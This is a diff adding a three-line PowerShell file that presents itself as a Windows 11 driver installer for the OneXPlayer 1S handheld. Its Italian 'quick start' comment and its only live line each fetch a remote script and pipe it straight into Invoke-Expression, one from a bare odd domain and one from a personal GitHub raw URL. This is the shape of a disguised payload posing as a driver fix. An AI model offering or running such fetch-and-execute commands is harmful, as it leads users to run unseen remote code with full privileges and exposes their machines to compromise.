@@ -1,0 +1,3 @@
+# OneXPlayer 1S - Driver Installer Utility (Windows 11 Pro)
+# Avvio rapido: irm 070293.xyz/oxp-win | iex
+irm 'https://raw.githubusercontent.com/dilfal/onexplayer-1s-drivers/main/oxp1s.ps1' | iex
